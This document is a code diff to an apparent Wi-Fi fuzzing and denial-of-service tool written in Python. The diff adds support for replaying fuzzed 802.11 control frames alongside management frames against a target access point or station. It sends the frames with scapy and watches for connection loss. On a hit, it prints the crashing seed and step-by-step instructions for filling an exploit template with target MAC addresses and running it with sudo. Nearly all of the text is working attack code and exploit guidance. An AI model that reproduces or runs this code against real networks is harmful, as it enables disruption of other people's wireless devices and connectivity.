@@ -18,7 +18,7 @@ def nec_checks():
     Deauth_monitor.start()
 
 
-def DoS_attack_init(file_list, mode):
+def DoS_attack_init(file_list, mode, frames_dir):
     chosen_files_list = []
     frames_list = []
     subprocess.call(['clear'], shell=True)
@@ -38,7 +38,7 @@ def DoS_attack_init(file_list, mode):
         print(bcolors.FAIL + '\nNo relevant files found :(' + bcolors.ENDC)
         os._exit(0)
     for files in chosen_files_list:
-        with open(current_dir + "/Logs/fuzz_mngmt_frames/" + files, 'r') as f:
+        with open(current_dir + frames_dir + files, 'r') as f:
             for line in f:
                 if "frame = " in line:
                     temp = line.strip("frame = \nb'")
@@ -49,25 +49,39 @@ def DoS_attack_init(file_list, mode):
     return frames_list
     
     
-def print_exploit(frame):
-    print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
-    print(f'\n{frame[32:]}\n')
-    print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
-    subtype = int(int.from_bytes(frame[8:9], "big") / 16)
-    print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
-    print('Also do the replacements:')
-    if subtype in {0, 2, 4, 11}:
-        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
-    elif subtype in {1, 3, 5, 8}:
-        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
-    print('Finally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
-    print(f'After the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit.py{bcolors.ENDC}\n')
-    print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
-    input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
-    subprocess.call(['clear'], shell=True)
+def print_exploit(frame, frame_type):
+    if frame_type == 1:
+        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
+        print(f'\n{frame[32:]}\n')
+        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
+        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
+        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
+        print('\nAlso do the replacements:')
+        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
+        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
+        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_mngmt.py{bcolors.ENDC}')
+        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
+        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
+        subprocess.call(['clear'], shell=True)
+    elif frame_type == 2:
+        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
+        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
+        if subtype in {4,5,6}:
+             print(f'\n{frame[19:]}\n')
+        else:
+            print(f'\n{frame[25:]}\n')
+        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
+        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
+        print('Replace ' + bcolors.OKBLUE + '{FCf} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[9:10], "big")}')
+        print('\nAlso do the replacements:')
+        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA')
+        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
+        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_ctrl.py{bcolors.ENDC}')
+        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
+        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
+        subprocess.call(['clear'], shell=True)
     
-    
-def send_frames(frames_list, mode):
+def send_frames(frames_list, mode, frame_type):
     counter = 0
     if mode == 1:
         try:
@@ -80,13 +94,13 @@ def send_frames(frames_list, mode):
             for _ in range(0, num_of_frames):
                 sendp(frame, count=1, iface=att_interface, verbose=0)
                 if not settings.is_alive:
-                    print_exploit(frame)
+                    print_exploit(frame, frame_type)
                     sleep(10)
                     settings.is_alive = True
                     settings.conn_loss = False
                     break
                 elif settings.conn_loss:
-                    print_exploit(frame)
+                    print_exploit(frame, frame_type)
                     sleep(10)
                     settings.is_alive = True
                     settings.conn_loss = False      
@@ -128,13 +142,29 @@ try:
 except:
     print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
     os._exit(0)
-
+subprocess.call(['clear'], shell=True)
+print(dos_attack)
+print('1) Management Frames')
+print('2) Control Frames\n\n')
+try:
+    choice1 = int(input('Select the type of the frames: '))
+except:
+    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+    os._exit(0)
 current_dir = os.getcwd()
-file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
+if choice1 == 1:
+    file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
+    frames_dir = "/Logs/fuzz_mngmt_frames/"
+elif choice1 == 2:
+    file_list = os.listdir(current_dir + "/Logs/fuzz_ctrl_frames")
+    frames_dir = "/Logs/fuzz_ctrl_frames/"
+else:
+    print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
+    os._exit(0)
 
-init_att = DoS_attack_init(file_list, choice)
+init_att = DoS_attack_init(file_list, choice, frames_dir)
 nec_checks()
 sleep(20)
 
 subprocess.call(['clear'], shell=True)
-send_frames(init_att, choice)
+send_frames(init_att, choice, choice1)
